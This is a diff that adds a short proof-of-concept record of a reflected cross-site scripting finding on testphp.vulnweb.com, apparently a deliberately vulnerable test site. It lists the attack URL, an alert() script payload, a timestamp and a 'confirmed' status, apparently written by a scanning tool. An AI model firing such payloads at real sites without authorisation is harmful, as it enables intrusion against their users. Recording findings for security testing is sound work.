@@ -1,0 +1,6 @@
+XSS Vulnerability PoC
+Type: Reflected_XSS
+URL: http://testphp.vulnweb.com/search.php?searchFor=test?back=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E
+Payload: <script>alert("XSS")</script>
+Timestamp: 2025-09-06T11:13:46.872536
+Status: VULNERABILITY CONFIRMED
